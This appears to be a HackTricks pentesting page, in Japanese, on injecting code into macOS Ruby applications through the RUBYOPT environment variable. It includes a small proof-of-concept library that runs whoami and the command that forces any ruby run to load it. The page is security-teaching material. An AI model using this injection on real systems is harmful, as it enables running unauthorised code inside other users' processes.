# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

この環境変数を使用すると、**ruby**が実行されるたびに**新しいパラメータ**を**追加**することが可能です。パラメータ**`-e`**を使用して実行するrubyコードを指定することはできませんが、**`-I`**および**`-r`**のパラメータを使用してライブラリのロードパスに新しいフォルダを追加し、**ロードするライブラリを指定**することができます。

ライブラリ**`inject.rb`**を**`/tmp`**に作成します:
```ruby:inject.rb
puts `whoami`
```
どこにでも次のようなRubyスクリプトを作成します:
```ruby:hello.rb
puts 'Hello, World!'
```
その後、任意のRubyスクリプトを次のように読み込ませます:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
面白い事実ですが、**`--disable-rubyopt`** パラメータを使用しても動作します:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
{{#include ../../../banners/hacktricks-training.md}}
